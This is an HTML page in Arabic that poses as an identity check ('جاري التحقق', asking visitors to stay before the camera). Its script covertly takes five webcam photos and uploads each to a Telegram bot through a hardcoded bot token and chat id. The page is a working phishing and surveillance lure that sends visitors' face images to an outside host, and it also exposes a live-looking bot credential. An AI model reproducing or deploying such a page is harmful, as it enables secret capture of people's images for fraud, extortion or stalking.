<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تأكيد الهوية</title>
  <style>
    body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
    video, canvas { margin: 10px; border: 2px solid #000; }
  </style>
</head>
<body>
  <h2>جاري التحقق...</h2>
  <p>يرجى البقاء أمام الكاميرا</p>

  <video id="video" width="300" autoplay muted></video>
  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
    const chat_id = '6437823957';

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // التقط 5 صور بفاصل 200ms
        let count = 0;
        const maxPhotos = 5;
        const interval = setInterval(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg');
          count++;
          if (count >= maxPhotos) clearInterval(interval);
        }, 200);
      })
      .catch(err => alert("فشل تشغيل الكاميرا: " + err));

    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', blob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => console.log("تم الإرسال"))
      .catch(err => console.error("خطأ:", err));
    }
  </script>
</body>
</html>
